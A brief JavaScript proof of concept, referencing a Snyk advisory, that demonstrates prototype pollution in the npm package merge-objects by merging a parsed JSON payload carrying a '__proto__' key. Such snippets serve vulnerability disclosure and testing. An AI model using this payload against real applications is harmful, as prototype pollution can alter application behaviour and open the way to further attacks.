//https://snyk.io/vuln/npm:merge-objects:20180415
 
  const merge = require("merge-objects");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  obj = {};

   

  merge({}, JSON.parse(malicious_payload));
// End of file
